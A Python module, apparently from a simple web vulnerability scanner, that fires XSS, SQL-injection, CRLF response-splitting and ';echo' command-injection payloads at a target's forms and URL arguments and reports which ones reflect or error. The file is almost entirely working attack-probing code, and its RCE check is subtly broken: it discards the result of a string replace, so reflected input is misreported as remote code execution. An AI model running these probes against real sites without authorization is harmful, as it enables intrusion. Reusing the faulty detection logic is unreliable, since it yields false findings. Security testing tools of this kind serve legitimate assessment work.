import requests

class PayloadMgr:
    def __init__(self, attvectors):
        self.getargs = attvectors[0]
        self.forms = attvectors[1]
        self.formpayloads = ["/<payload>&", "'"]
        self.argpayloads = ["/<payload>\"", "'", "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%"
                                                "0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<ht"
                                                "ml>Sorry,%20System%20Down</html>", ";echo \"payload123456789\""]
        self.xssforms = []
        self.xssargs = []
        self.sqliforms = []
        self.sqliargs = []
        self.crlf = []
        self.rce = []



    def XSS(self):
        self.forms = [x for x in self.forms if x]
        for each in self.forms:
            if len(each["Inputs"]) > 0:
                dest = each["Destination"]
                data = {}
                for arg in each["Inputs"]:
                    data[arg] = self.formpayloads[0]
                for arg in each["PassiveInputs"]:
                    data[arg[0]] = arg[1]
                r = requests.post(dest, data)
                if self.formpayloads[0] in r.text:
                    print("\nFound an XSS vulnerability !")
                    self.xssforms.append(dict(each))
        for each in self.getargs:
            url = each["URL"] + "?"
            for args in each["Arguments"]:
                if "=" in url:
                    url += "&"
                url += args + "=" + self.argpayloads[0]
            r = requests.get(url)
            if self.argpayloads[0] in r.text:
                print("\nFound an XSS vulnerability !")
                self.xssargs.append(dict(each))

    def SQLi(self):
        self.forms = [x for x in self.forms if x]
        file = open("../assets/sqlerrors", "r")
        errors = file.read().split("\n")
        file.close()
        for each in self.forms:
            if len(each["Inputs"]) > 0:
                dest = each["Destination"]
                data = {}
                for arg in each["Inputs"]:
                    data[arg] = self.formpayloads[1]
                for arg in each["PassiveInputs"]:
                    data[arg[0]] = arg[1]
                r = requests.post(dest, data)
                for err in errors:
                    if err in r.text:
                        print("\nFound an SQLi vulnerability !")
                        self.sqliforms.append(dict(each))
        for each in self.getargs:
            url = each["URL"] + "?"
            for args in each["Arguments"]:
                if "=" in url:
                    url += "&"
                url += args + "=" + self.argpayloads[1]
            r = requests.get(url)
            for err in errors:
                if err in r.text:
                    print("\nFound an SQLi vulnerability !")
                    self.sqliargs.append(dict(each))

    def CRLF(self):
        for each in self.getargs:
            url = each["URL"] + "?"
            for args in each["Arguments"]:
                if "=" in url:
                    url += "&"
                url += args + "=" + self.argpayloads[2]
            r = requests.get(url)
            if "Sorry, System Down" in r.text:
                print("\nFound a CRLF vulnerability !")
                self.crlf.append(dict(each))

    def RCE(self):
        for each in self.getargs:
            url = each["URL"] + "?"
            for args in each["Arguments"]:
                if "=" in url:
                    url += "&"
                url += args + "=" + self.argpayloads[3]
            r = requests.get(url)
            r.text.replace(self.argpayloads[3], "")     # Remove an eventual reflected arg from the response
            if "payload123456789" in r.text:
                print("\nFound a PHP RCE vulnerability !")
                self.rce.append(dict(each))



    def launchPayloadMgr(self):
        self.XSS()
        self.SQLi()
        self.CRLF()
        self.RCE()
        vulnvectors = {"XSS forms": self.xssforms, "XSS args": self.xssargs,
                       "SQLi forms": self.sqliforms, "SQLi args": self.sqliargs,
                       "CRLF": self.crlf, "RCE": self.rce}

        return vulnvectors
